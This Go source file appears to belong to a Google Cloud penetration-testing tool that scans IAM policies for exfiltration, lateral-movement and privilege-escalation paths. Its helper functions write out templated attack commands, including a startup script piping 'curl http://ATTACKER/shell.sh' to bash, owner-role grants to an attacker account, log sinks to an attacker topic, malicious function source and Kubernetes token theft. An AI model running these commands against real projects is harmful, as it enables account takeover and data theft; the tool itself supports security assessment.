func (s *AttackPathService) AnalyzeResourceAttackPaths(ctx context.Context, projectID, pathType string) ([]AttackPath, error) {
	var paths []AttackPath

	// Get permission maps based on path type
	exfilPermMap, lateralPermMap, privescPermMap := s.getPermissionMaps(pathType)

	// Get IAM service for role resolution
	iamService, err := s.getIAMService(ctx)
	if err != nil {
		iamService = nil
	}

	// Analyze GCS bucket IAM policies
	bucketPaths := s.analyzeBucketIAM(ctx, projectID, pathType, exfilPermMap, lateralPermMap, privescPermMap, iamService)
	paths = append(paths, bucketPaths...)

	// Analyze BigQuery dataset IAM policies
	bqPaths := s.analyzeBigQueryIAM(ctx, projectID, pathType, exfilPermMap, lateralPermMap, privescPermMap, iamService)
	paths = append(paths, bqPaths...)

	// Analyze Service Account IAM policies
	saPaths := s.analyzeServiceAccountIAM(ctx, projectID, pathType, exfilPermMap, lateralPermMap, privescPermMap, iamService)
	paths = append(paths, saPaths...)

	// Analyze Compute resource IAM (images, snapshots)
	computePaths := s.analyzeComputeResourceIAM(ctx, projectID, pathType, exfilPermMap, lateralPermMap, privescPermMap, iamService)
	paths = append(paths, computePaths...)

	return paths, nil
}

// analyzeBucketIAM analyzes IAM policies on GCS buckets
func (s *AttackPathService) analyzeBucketIAM(ctx context.Context, projectID, pathType string, exfilPermMap map[string]DataExfilPermission, lateralPermMap map[string]LateralMovementPermission, privescPermMap map[string]PrivescPermission, iamService *iam.Service) []AttackPath {
	var paths []AttackPath

	storageService, err := s.getStorageService(ctx)
	if err != nil {
		return paths
	}

	// List buckets in the project
	buckets, err := storageService.Buckets.List(projectID).Do()
	if err != nil {
		return paths
	}

	for _, bucket := range buckets.Items {
		// Get IAM policy for this bucket
		policy, err := storageService.Buckets.GetIamPolicy(bucket.Name).Do()
		if err != nil {
			continue
		}

		for _, binding := range policy.Bindings {
			permissions := s.getRolePermissions(iamService, binding.Role, projectID)
			for _, member := range binding.Members {
				memberPaths := s.analyzePermissionsForAttackPaths(
					member, binding.Role, permissions, projectID,
					"resource", fmt.Sprintf("gs://%s", bucket.Name), bucket.Name,
					pathType, exfilPermMap, lateralPermMap, privescPermMap,
				)
				paths = append(paths, memberPaths...)
			}
		}
	}

	return paths
}

// analyzeBigQueryIAM analyzes IAM policies on BigQuery datasets
func (s *AttackPathService) analyzeBigQueryIAM(ctx context.Context, projectID, pathType string, exfilPermMap map[string]DataExfilPermission, lateralPermMap map[string]LateralMovementPermission, privescPermMap map[string]PrivescPermission, iamService *iam.Service) []AttackPath {
	var paths []AttackPath

	bqService, err := s.getBigQueryService(ctx)
	if err != nil {
		return paths
	}

	// List datasets in the project
	datasets, err := bqService.Datasets.List(projectID).Do()
	if err != nil {
		return paths
	}

	for _, dataset := range datasets.Datasets {
		datasetID := dataset.DatasetReference.DatasetId

		// Get dataset to access IAM policy
		ds, err := bqService.Datasets.Get(projectID, datasetID).Do()
		if err != nil {
			continue
		}

		// BigQuery uses Access entries instead of standard IAM bindings
		for _, access := range ds.Access {
			member := ""
			if access.UserByEmail != "" {
				member = "user:" + access.UserByEmail
			} else if access.GroupByEmail != "" {
				member = "group:" + access.GroupByEmail
			} else if access.SpecialGroup != "" {
				member = access.SpecialGroup
			} else if access.IamMember != "" {
				member = access.IamMember
			}

			if member == "" {
				continue
			}

			role := access.Role
			permissions := s.getRolePermissions(iamService, "roles/bigquery."+strings.ToLower(role), projectID)

			memberPaths := s.analyzePermissionsForAttackPaths(
				member, role, permissions, projectID,
				"resource", fmt.Sprintf("%s:%s", projectID, datasetID), datasetID,
				pathType, exfilPermMap, lateralPermMap, privescPermMap,
			)
			paths = append(paths, memberPaths...)
		}
	}

	return paths
}

// analyzeServiceAccountIAM analyzes IAM policies on service accounts
func (s *AttackPathService) analyzeServiceAccountIAM(ctx context.Context, projectID, pathType string, exfilPermMap map[string]DataExfilPermission, lateralPermMap map[string]LateralMovementPermission, privescPermMap map[string]PrivescPermission, iamService *iam.Service) []AttackPath {
	var paths []AttackPath

	if iamService == nil {
		var err error
		iamService, err = s.getIAMService(ctx)
		if err != nil {
			return paths
		}
	}

	// List service accounts in the project
	saList, err := iamService.Projects.ServiceAccounts.List("projects/" + projectID).Do()
	if err != nil {
		return paths
	}

	for _, sa := range saList.Accounts {
		// Get IAM policy for this service account
		policy, err := iamService.Projects.ServiceAccounts.GetIamPolicy("projects/" + projectID + "/serviceAccounts/" + sa.Email).Do()
		if err != nil {
			continue
		}

		for _, binding := range policy.Bindings {
			permissions := s.getRolePermissions(iamService, binding.Role, projectID)
			for _, member := range binding.Members {
				memberPaths := s.analyzePermissionsForAttackPaths(
					member, binding.Role, permissions, projectID,
					"resource", sa.Email, sa.DisplayName,
					pathType, exfilPermMap, lateralPermMap, privescPermMap,
				)
				paths = append(paths, memberPaths...)
			}
		}
	}

	return paths
}

// analyzeComputeResourceIAM analyzes IAM policies on compute resources (images, snapshots)
func (s *AttackPathService) analyzeComputeResourceIAM(ctx context.Context, projectID, pathType string, exfilPermMap map[string]DataExfilPermission, lateralPermMap map[string]LateralMovementPermission, privescPermMap map[string]PrivescPermission, iamService *iam.Service) []AttackPath {
	var paths []AttackPath

	computeService, err := s.getComputeService(ctx)
	if err != nil {
		return paths
	}

	// Analyze images
	images, err := computeService.Images.List(projectID).Do()
	if err == nil {
		for _, image := range images.Items {
			policy, err := computeService.Images.GetIamPolicy(projectID, image.Name).Do()
			if err != nil {
				continue
			}

			for _, binding := range policy.Bindings {
				permissions := s.getRolePermissions(iamService, binding.Role, projectID)
				for _, member := range binding.Members {
					memberPaths := s.analyzePermissionsForAttackPaths(
						member, binding.Role, permissions, projectID,
						"resource", fmt.Sprintf("image/%s", image.Name), image.Name,
						pathType, exfilPermMap, lateralPermMap, privescPermMap,
					)
					paths = append(paths, memberPaths...)
				}
			}
		}
	}

	// Analyze snapshots
	snapshots, err := computeService.Snapshots.List(projectID).Do()
	if err == nil {
		for _, snapshot := range snapshots.Items {
			policy, err := computeService.Snapshots.GetIamPolicy(projectID, snapshot.Name).Do()
			if err != nil {
				continue
			}

			for _, binding := range policy.Bindings {
				permissions := s.getRolePermissions(iamService, binding.Role, projectID)
				for _, member := range binding.Members {
					memberPaths := s.analyzePermissionsForAttackPaths(
						member, binding.Role, permissions, projectID,
						"resource", fmt.Sprintf("snapshot/%s", snapshot.Name), snapshot.Name,
						pathType, exfilPermMap, lateralPermMap, privescPermMap,
					)
					paths = append(paths, memberPaths...)
				}
			}
		}
	}

	return paths
}

// CombinedAttackPathAnalysis performs attack path analysis across all scopes
func (s *AttackPathService) CombinedAttackPathAnalysis(ctx context.Context, projectIDs []string, projectNames map[string]string, pathType string) (*CombinedAttackPathData, error) {
	result := &CombinedAttackPathData{
		OrgPaths:      []AttackPath{},
		FolderPaths:   []AttackPath{},
		ProjectPaths:  []AttackPath{},
		ResourcePaths: []AttackPath{},
		AllPaths:      []AttackPath{},
		OrgNames:      make(map[string]string),
		FolderNames:   make(map[string]string),
		OrgIDs:        []string{},
	}

	// Analyze organization-level IAM
	orgPaths, orgNames, orgIDs, err := s.AnalyzeOrganizationAttackPaths(ctx, pathType)
	if err != nil {
		gcpinternal.HandleGCPError(err, logger, globals.GCP_DATAEXFILTRATION_MODULE_NAME, "Could not analyze organization attack paths")
	} else {
		result.OrgPaths = orgPaths
		result.OrgNames = orgNames
		result.OrgIDs = orgIDs
		result.AllPaths = append(result.AllPaths, orgPaths...)
	}

	// Analyze folder-level IAM
	folderPaths, folderNames, err := s.AnalyzeFolderAttackPaths(ctx, pathType)
	if err != nil {
		gcpinternal.HandleGCPError(err, logger, globals.GCP_DATAEXFILTRATION_MODULE_NAME, "Could not analyze folder attack paths")
	} else {
		result.FolderPaths = folderPaths
		result.FolderNames = folderNames
		result.AllPaths = append(result.AllPaths, folderPaths...)
	}

	// Analyze project-level IAM and resource-level IAM for each project
	for _, projectID := range projectIDs {
		projectName := projectID
		if name, ok := projectNames[projectID]; ok {
			projectName = name
		}

		// Project-level
		projectPathsList, err := s.AnalyzeProjectAttackPaths(ctx, projectID, projectName, pathType)
		if err != nil {
			gcpinternal.HandleGCPError(err, logger, globals.GCP_DATAEXFILTRATION_MODULE_NAME,
				fmt.Sprintf("Could not analyze attack paths for project %s", projectID))
			continue
		}
		result.ProjectPaths = append(result.ProjectPaths, projectPathsList...)
		result.AllPaths = append(result.AllPaths, projectPathsList...)

		// Resource-level
		resourcePaths, err := s.AnalyzeResourceAttackPaths(ctx, projectID, pathType)
		if err != nil {
			gcpinternal.HandleGCPError(err, logger, globals.GCP_DATAEXFILTRATION_MODULE_NAME,
				fmt.Sprintf("Could not analyze resource attack paths for project %s", projectID))
			continue
		}
		result.ResourcePaths = append(result.ResourcePaths, resourcePaths...)
		result.AllPaths = append(result.AllPaths, resourcePaths...)
	}

	return result, nil
}

// Helper functions

func (s *AttackPathService) getPermissionMaps(pathType string) (map[string]DataExfilPermission, map[string]LateralMovementPermission, map[string]PrivescPermission) {
	exfilPermMap := make(map[string]DataExfilPermission)
	lateralPermMap := make(map[string]LateralMovementPermission)
	privescPermMap := make(map[string]PrivescPermission)

	if pathType == "exfil" || pathType == "all" {
		for _, p := range GetDataExfilPermissions() {
			exfilPermMap[p.Permission] = p
		}
	}

	if pathType == "lateral" || pathType == "all" {
		for _, p := range GetLateralMovementPermissions() {
			lateralPermMap[p.Permission] = p
		}
	}

	if pathType == "privesc" || pathType == "all" {
		for _, p := range GetPrivescPermissions() {
			privescPermMap[p.Permission] = p
		}
	}

	return exfilPermMap, lateralPermMap, privescPermMap
}

func (s *AttackPathService) getRolePermissions(iamService *iam.Service, role string, projectID string) []string {
	if iamService == nil {
		return []string{}
	}

	ctx := context.Background()
	var roleInfo *iam.Role
	var err error

	if strings.HasPrefix(role, "roles/") {
		roleInfo, err = iamService.Roles.Get(role).Do()
	} else if strings.HasPrefix(role, "projects/") {
		roleInfo, err = iamService.Projects.Roles.Get(role).Do()
	} else if strings.HasPrefix(role, "organizations/") {
		roleInfo, err = iamService.Organizations.Roles.Get(role).Do()
	} else {
		roleInfo, err = iamService.Roles.Get("roles/" + role).Do()
	}

	if err != nil {
		return s.getTestablePermissions(ctx, iamService, role, projectID)
	}

	return roleInfo.IncludedPermissions
}

func (s *AttackPathService) getTestablePermissions(ctx context.Context, iamService *iam.Service, role string, projectID string) []string {
	// Return known permissions for common roles
	knownRoles := map[string][]string{
		"roles/owner": {
			"storage.objects.get", "storage.objects.list", "bigquery.tables.getData",
			"compute.images.create", "compute.snapshots.create", "logging.sinks.create",
			"compute.networks.addPeering", "compute.instances.setMetadata",
		},
		"roles/editor": {
			"storage.objects.get", "storage.objects.list", "bigquery.tables.getData",
			"compute.images.create", "compute.snapshots.create",
			"compute.instances.setMetadata",
		},
		"roles/storage.objectViewer": {
			"storage.objects.get", "storage.objects.list",
		},
		"roles/bigquery.dataViewer": {
			"bigquery.tables.getData",
		},
	}

	if perms, ok := knownRoles[role]; ok {
		return perms
	}
	return []string{}
}

func (s *AttackPathService) analyzePermissionsForAttackPaths(
	member, role string, permissions []string, projectID,
	scopeType, scopeID, scopeName, pathType string,
	exfilPermMap map[string]DataExfilPermission,
	lateralPermMap map[string]LateralMovementPermission,
	privescPermMap map[string]PrivescPermission,
) []AttackPath {
	var paths []AttackPath

	// Skip allUsers/allAuthenticatedUsers for permission-based analysis
	if member == "allUsers" || member == "allAuthenticatedUsers" {
		return paths
	}

	principalType := extractPrincipalType(member)
	principal := extractPrincipalEmail(member)

	// Check for exfil permissions
	for _, perm := range permissions {
		if exfilPerm, ok := exfilPermMap[perm]; ok {
			path := AttackPath{
				Principal:      principal,
				PrincipalType:  principalType,
				Method:         perm,
				TargetResource: scopeName,
				Permissions:    []string{perm},
				Category:       exfilPerm.Category,
				RiskLevel:      exfilPerm.RiskLevel,
				Description:    exfilPerm.Description,
				ExploitCommand: generateExfilCommand(perm, projectID, scopeID),
				ProjectID:      projectID,
				ScopeType:      scopeType,
				ScopeID:        scopeID,
				ScopeName:      scopeName,
				PathType:       "exfil",
			}
			paths = append(paths, path)
		}
	}

	// Check for lateral movement permissions
	for _, perm := range permissions {
		if lateralPerm, ok := lateralPermMap[perm]; ok {
			path := AttackPath{
				Principal:      principal,
				PrincipalType:  principalType,
				Method:         perm,
				TargetResource: scopeName,
				Permissions:    []string{perm},
				Category:       lateralPerm.Category,
				RiskLevel:      lateralPerm.RiskLevel,
				Description:    lateralPerm.Description,
				ExploitCommand: generateLateralCommand(perm, projectID, scopeID),
				ProjectID:      projectID,
				ScopeType:      scopeType,
				ScopeID:        scopeID,
				ScopeName:      scopeName,
				PathType:       "lateral",
			}
			paths = append(paths, path)
		}
	}

	// Check for privesc permissions
	for _, perm := range permissions {
		if privescPerm, ok := privescPermMap[perm]; ok {
			path := AttackPath{
				Principal:      principal,
				PrincipalType:  principalType,
				Method:         perm,
				TargetResource: scopeName,
				Permissions:    []string{perm},
				Category:       privescPerm.Category,
				RiskLevel:      privescPerm.RiskLevel,
				Description:    privescPerm.Description,
				ExploitCommand: generatePrivescCommand(perm, projectID, scopeID),
				ProjectID:      projectID,
				ScopeType:      scopeType,
				ScopeID:        scopeID,
				ScopeName:      scopeName,
				PathType:       "privesc",
			}
			paths = append(paths, path)
		}
	}

	return paths
}

func extractPrincipalType(member string) string {
	if strings.HasPrefix(member, "user:") {
		return "user"
	} else if strings.HasPrefix(member, "serviceAccount:") {
		return "serviceAccount"
	} else if strings.HasPrefix(member, "group:") {
		return "group"
	} else if strings.HasPrefix(member, "domain:") {
		return "domain"
	}
	return "unknown"
}

func extractPrincipalEmail(member string) string {
	parts := strings.SplitN(member, ":", 2)
	if len(parts) == 2 {
		return parts[1]
	}
	return member
}

func generateExfilCommand(permission, projectID, scopeID string) string {
	switch permission {
	case "compute.images.create":
		return fmt.Sprintf("gcloud compute images create exfil-image --source-disk=DISK --source-disk-zone=ZONE --project=%s", projectID)
	case "compute.snapshots.create":
		return fmt.Sprintf("gcloud compute snapshots create exfil-snap --source-disk=DISK --source-disk-zone=ZONE --project=%s", projectID)
	case "logging.sinks.create":
		return fmt.Sprintf("gcloud logging sinks create exfil-sink pubsub.googleapis.com/projects/ATTACKER/topics/logs --project=%s", projectID)
	case "storage.objects.get":
		return fmt.Sprintf("gsutil cp gs://%s/OBJECT ./local --project=%s", scopeID, projectID)
	case "bigquery.tables.getData":
		return fmt.Sprintf("bq query --use_legacy_sql=false 'SELECT * FROM `%s.TABLE`'", scopeID)
	case "secretmanager.versions.access":
		return fmt.Sprintf("gcloud secrets versions access latest --secret=SECRET --project=%s", projectID)
	default:
		return fmt.Sprintf("# %s - refer to GCP documentation", permission)
	}
}

func generateLateralCommand(permission, projectID, scopeID string) string {
	switch permission {
	case "compute.networks.addPeering":
		return fmt.Sprintf("gcloud compute networks peerings create peering --network=NET --peer-network=projects/TARGET/global/networks/NET --project=%s", projectID)
	case "compute.instances.osLogin":
		return fmt.Sprintf("gcloud compute ssh INSTANCE --zone=ZONE --project=%s", projectID)
	case "compute.instances.setMetadata":
		return fmt.Sprintf("gcloud compute instances add-metadata INSTANCE --zone=ZONE --metadata=ssh-keys=\"user:$(cat ~/.ssh/id_rsa.pub)\" --project=%s", projectID)
	case "iam.serviceAccounts.getAccessToken":
		return fmt.Sprintf("gcloud auth print-access-token --impersonate-service-account=%s", scopeID)
	case "container.clusters.getCredentials":
		return fmt.Sprintf("gcloud container clusters get-credentials CLUSTER --zone=ZONE --project=%s", projectID)
	default:
		return fmt.Sprintf("# %s - refer to GCP documentation", permission)
	}
}

func generatePrivescCommand(permission, projectID, scopeID string) string {
	switch permission {
	// Service Account Impersonation
	case "iam.serviceAccounts.getAccessToken":
		return fmt.Sprintf("gcloud auth print-access-token --impersonate-service-account=TARGET_SA@%s.iam.gserviceaccount.com", projectID)
	case "iam.serviceAccounts.signBlob":
		return fmt.Sprintf("gcloud iam service-accounts sign-blob input.txt output.sig --iam-account=TARGET_SA@%s.iam.gserviceaccount.com", projectID)
	case "iam.serviceAccounts.signJwt":
		return fmt.Sprintf("gcloud iam service-accounts sign-jwt jwt.json signed.jwt --iam-account=TARGET_SA@%s.iam.gserviceaccount.com", projectID)
	case "iam.serviceAccounts.implicitDelegation":
		return fmt.Sprintf("# Chain through intermediary SA: gcloud auth print-access-token --impersonate-service-account=TARGET_SA@%s.iam.gserviceaccount.com", projectID)
	case "iam.serviceAccounts.getOpenIdToken":
		return fmt.Sprintf("gcloud auth print-identity-token --impersonate-service-account=TARGET_SA@%s.iam.gserviceaccount.com --audiences=https://TARGET", projectID)

	// Key Creation
	case "iam.serviceAccountKeys.create":
		return fmt.Sprintf("gcloud iam service-accounts keys create key.json --iam-account=TARGET_SA@%s.iam.gserviceaccount.com", projectID)
	case "iam.serviceAccountKeys.delete":
		return fmt.Sprintf("gcloud iam service-accounts keys delete KEY_ID --iam-account=TARGET_SA@%s.iam.gserviceaccount.com", projectID)
	case "storage.hmacKeys.create":
		return fmt.Sprintf("gcloud storage hmac create TARGET_SA@%s.iam.gserviceaccount.com", projectID)
	case "apikeys.keys.create":
		return fmt.Sprintf("gcloud alpha services api-keys create --project=%s", projectID)

	// IAM Policy Modification
	case "resourcemanager.projects.setIamPolicy":
		return fmt.Sprintf("gcloud projects add-iam-policy-binding %s --member=user:ATTACKER@gmail.com --role=roles/owner", projectID)
	case "resourcemanager.folders.setIamPolicy":
		return fmt.Sprintf("gcloud resource-manager folders add-iam-policy-binding %s --member=user:ATTACKER@gmail.com --role=roles/owner", scopeID)
	case "resourcemanager.organizations.setIamPolicy":
		return fmt.Sprintf("gcloud organizations add-iam-policy-binding %s --member=user:ATTACKER@gmail.com --role=roles/owner", scopeID)
	case "iam.serviceAccounts.setIamPolicy":
		return fmt.Sprintf("gcloud iam service-accounts add-iam-policy-binding %s --member=user:ATTACKER@gmail.com --role=roles/iam.serviceAccountTokenCreator", scopeID)
	case "iam.roles.update":
		return fmt.Sprintf("gcloud iam roles update ROLE_ID --project=%s --add-permissions=iam.serviceAccounts.getAccessToken", projectID)
	case "iam.roles.create":
		return fmt.Sprintf("gcloud iam roles create privesc_role --project=%s --permissions=iam.serviceAccounts.getAccessToken,iam.serviceAccountKeys.create", projectID)

	// Resource-level IAM
	case "storage.buckets.setIamPolicy":
		return fmt.Sprintf("gsutil iam ch user:ATTACKER@gmail.com:objectAdmin gs://%s", scopeID)
	case "pubsub.topics.setIamPolicy":
		return fmt.Sprintf("gcloud pubsub topics add-iam-policy-binding %s --member=user:ATTACKER@gmail.com --role=roles/pubsub.publisher --project=%s", scopeID, projectID)
	case "bigquery.datasets.setIamPolicy":
		return fmt.Sprintf("bq update --source=dataset_acl.json %s:%s", projectID, scopeID)
	case "secretmanager.secrets.setIamPolicy":
		return fmt.Sprintf("gcloud secrets add-iam-policy-binding %s --member=user:ATTACKER@gmail.com --role=roles/secretmanager.secretAccessor --project=%s", scopeID, projectID)
	case "kms.cryptoKeys.setIamPolicy":
		return fmt.Sprintf("gcloud kms keys add-iam-policy-binding KEY --keyring=KEYRING --location=LOCATION --member=user:ATTACKER@gmail.com --role=roles/cloudkms.cryptoKeyDecrypter --project=%s", projectID)

	// Compute
	case "compute.instances.create":
		return fmt.Sprintf("gcloud compute instances create pwn-vm --service-account=TARGET_SA@%s.iam.gserviceaccount.com --scopes=cloud-platform --zone=us-central1-a --project=%s", projectID, projectID)
	case "compute.instances.setServiceAccount":
		return fmt.Sprintf("gcloud compute instances set-service-account INSTANCE --service-account=TARGET_SA@%s.iam.gserviceaccount.com --zone=ZONE --project=%s", projectID, projectID)
	case "compute.instances.setMetadata":
		return fmt.Sprintf("gcloud compute instances add-metadata INSTANCE --zone=ZONE --metadata=startup-script='curl http://ATTACKER/shell.sh|bash' --project=%s", projectID)
	case "compute.projects.setCommonInstanceMetadata":
		return fmt.Sprintf("gcloud compute project-info add-metadata --metadata=ssh-keys=\"attacker:$(cat ~/.ssh/id_rsa.pub)\" --project=%s", projectID)
	case "compute.instances.osLogin":
		return fmt.Sprintf("gcloud compute ssh INSTANCE --zone=ZONE --project=%s", projectID)
	case "compute.instances.osAdminLogin":
		return fmt.Sprintf("gcloud compute ssh INSTANCE --zone=ZONE --project=%s  # Then: sudo su", projectID)
	case "compute.instanceTemplates.create":
		return fmt.Sprintf("gcloud compute instance-templates create pwn-template --service-account=TARGET_SA@%s.iam.gserviceaccount.com --scopes=cloud-platform --project=%s", projectID, projectID)

	// Cloud Functions
	case "cloudfunctions.functions.create":
		return fmt.Sprintf("gcloud functions deploy pwn --runtime=python39 --trigger-http --service-account=TARGET_SA@%s.iam.gserviceaccount.com --entry-point=main --source=. --project=%s", projectID, projectID)
	case "cloudfunctions.functions.update":
		return fmt.Sprintf("gcloud functions deploy EXISTING_FUNC --service-account=TARGET_SA@%s.iam.gserviceaccount.com --project=%s", projectID, projectID)
	case "cloudfunctions.functions.sourceCodeSet":
		return fmt.Sprintf("gcloud functions deploy FUNC --source=gs://ATTACKER_BUCKET/malicious.zip --project=%s", projectID)
	case "cloudfunctions.functions.setIamPolicy":
		return fmt.Sprintf("gcloud functions add-iam-policy-binding FUNC --member=allUsers --role=roles/cloudfunctions.invoker --project=%s", projectID)

	// Cloud Run
	case "run.services.create":
		return fmt.Sprintf("gcloud run deploy pwn --image=ATTACKER_IMAGE --service-account=TARGET_SA@%s.iam.gserviceaccount.com --allow-unauthenticated --region=us-central1 --project=%s", projectID, projectID)
	case "run.services.update":
		return fmt.Sprintf("gcloud run services update SERVICE --service-account=TARGET_SA@%s.iam.gserviceaccount.com --region=us-central1 --project=%s", projectID, projectID)
	case "run.jobs.create":
		return fmt.Sprintf("gcloud run jobs create pwn-job --image=ATTACKER_IMAGE --service-account=TARGET_SA@%s.iam.gserviceaccount.com --region=us-central1 --project=%s", projectID, projectID)
	case "run.jobs.run":
		return fmt.Sprintf("gcloud run jobs execute JOB_NAME --region=us-central1 --project=%s", projectID)

	// Data Processing
	case "dataproc.clusters.create":
		return fmt.Sprintf("gcloud dataproc clusters create pwn-cluster --service-account=TARGET_SA@%s.iam.gserviceaccount.com --region=us-central1 --project=%s", projectID, projectID)
	case "dataproc.jobs.create":
		return fmt.Sprintf("gcloud dataproc jobs submit pyspark gs://ATTACKER/pwn.py --cluster=CLUSTER --region=us-central1 --project=%s", projectID)
	case "dataflow.jobs.create":
		return fmt.Sprintf("gcloud dataflow jobs run pwn-job --gcs-location=gs://dataflow-templates/latest/... --service-account-email=TARGET_SA@%s.iam.gserviceaccount.com --region=us-central1 --project=%s", projectID, projectID)

	// AI/ML
	case "notebooks.instances.create":
		return fmt.Sprintf("gcloud notebooks instances create pwn-notebook --location=us-central1-a --service-account=TARGET_SA@%s.iam.gserviceaccount.com --project=%s", projectID, projectID)
	case "aiplatform.customJobs.create":
		return fmt.Sprintf("gcloud ai custom-jobs create --display-name=pwn-job --worker-pool-spec=... --service-account=TARGET_SA@%s.iam.gserviceaccount.com --region=us-central1 --project=%s", projectID, projectID)

	// Orchestration
	case "composer.environments.create":
		return fmt.Sprintf("gcloud composer environments create pwn-env --location=us-central1 --service-account=TARGET_SA@%s.iam.gserviceaccount.com --project=%s", projectID, projectID)
	case "cloudscheduler.jobs.create":
		return fmt.Sprintf("gcloud scheduler jobs create http pwn-job --schedule='* * * * *' --uri=https://TARGET --oidc-service-account-email=TARGET_SA@%s.iam.gserviceaccount.com --project=%s", projectID, projectID)
	case "cloudtasks.tasks.create":
		return fmt.Sprintf("gcloud tasks create-http-task --queue=QUEUE --url=https://TARGET --oidc-service-account-email=TARGET_SA@%s.iam.gserviceaccount.com --project=%s", projectID, projectID)

	// CI/CD
	case "cloudbuild.builds.create":
		return fmt.Sprintf("gcloud builds submit --config=cloudbuild.yaml --project=%s  # cloudbuild.yaml runs as Cloud Build SA", projectID)
	case "source.repos.update":
		return fmt.Sprintf("gcloud source repos clone REPO --project=%s  # Modify code for build injection", projectID)

	// Deployment Manager
	case "deploymentmanager.deployments.create":
		return fmt.Sprintf("gcloud deployment-manager deployments create pwn-deploy --config=config.yaml --project=%s  # config.yaml creates privileged resources", projectID)

	// GKE
	case "container.clusters.create":
		return fmt.Sprintf("gcloud container clusters create pwn-cluster --service-account=TARGET_SA@%s.iam.gserviceaccount.com --zone=us-central1-a --project=%s", projectID, projectID)
	case "container.clusters.getCredentials":
		return fmt.Sprintf("gcloud container clusters get-credentials CLUSTER --zone=ZONE --project=%s", projectID)
	case "container.pods.create":
		return fmt.Sprintf("kubectl run pwn --image=ATTACKER_IMAGE --serviceaccount=TARGET_SA")
	case "container.pods.exec":
		return "kubectl exec -it POD -- /bin/sh  # Then: cat /var/run/secrets/kubernetes.io/serviceaccount/token"
	case "container.secrets.get":
		return "kubectl get secret SECRET -o jsonpath='{.data}' | base64 -d"
	case "container.serviceAccounts.createToken":
		return "kubectl create token SERVICE_ACCOUNT --duration=999999h"

	// Secrets
	case "secretmanager.versions.access":
		return fmt.Sprintf("gcloud secrets versions access latest --secret=SECRET_NAME --project=%s", projectID)

	// Workload Identity Federation
	case "iam.workloadIdentityPools.create":
		return fmt.Sprintf("gcloud iam workload-identity-pools create pwn-pool --location=global --project=%s", projectID)
	case "iam.workloadIdentityPoolProviders.create":
		return fmt.Sprintf("gcloud iam workload-identity-pools providers create-oidc pwn-provider --location=global --workload-identity-pool=POOL --issuer-uri=https://ATTACKER --project=%s", projectID)

	// Org Policies
	case "orgpolicy.policy.set":
		return fmt.Sprintf("gcloud org-policies set-policy policy.yaml --project=%s  # Disable constraints like requireOsLogin", projectID)

	// SA Usage
	case "iam.serviceAccounts.actAs":
		return fmt.Sprintf("# Required alongside compute/serverless create permissions to attach SA")

	// Network Access
	case "iap.tunnelInstances.accessViaIAP":
		return fmt.Sprintf("gcloud compute start-iap-tunnel INSTANCE PORT --zone=ZONE --project=%s", projectID)
	case "compute.firewalls.create":
		return fmt.Sprintf("gcloud compute firewall-rules create allow-attacker --network=default --allow=tcp:22,tcp:3389 --source-ranges=ATTACKER_IP/32 --project=%s", projectID)

	default:
		return fmt.Sprintf("# %s - refer to GCP documentation for exploitation", permission)
	}
}
